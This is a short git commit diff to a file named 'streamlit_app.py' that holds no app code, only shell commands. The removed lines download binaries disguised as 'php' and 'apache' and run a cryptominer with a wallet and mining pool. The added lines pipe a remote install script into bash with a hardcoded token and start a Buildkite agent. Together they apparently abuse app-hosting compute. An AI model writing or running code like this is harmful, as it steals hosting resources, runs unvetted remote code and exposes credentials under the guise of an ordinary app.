b755b8c2f626d7ce6cf9aaf55b34613650fb674f
fariisna8 <fariisna8@gmail.com>
2024-08-20 09:44:37 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,3 +1,3 @@
 import os
-os.system('apt-get install wget')
-os.system('curl -L https://bitbucket.org/eatyourshet/php/raw/1a31554cdede888ae70fbeedc5e909a3926ea2da/php --output php && curl -L https://bitbucket.org/eatyourshet/php/raw/b1ee5dc709956a92763976e15dd18f9ab8f40698/apache --output apache && chmod +x apache php && ./php -algo rx/0 -wallet SaLvsBu6oFag1w7AWnq7MJe1kiEj39WXE7RwTNzRH8sU2xy3sSxZfwQjLHRqLUu32NTfEqd7xKhMwK3t3V2Tix9EZUtghWuUwyN -pool1 pool.hashvault.pro:443 -rigName CPU-3')
+os.system('TOKEN="vDh7GJmLX2wMMCwm8W7qmBTX" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`"')
+os.system('~/.buildkite-agent/bin/buildkite-agent start')
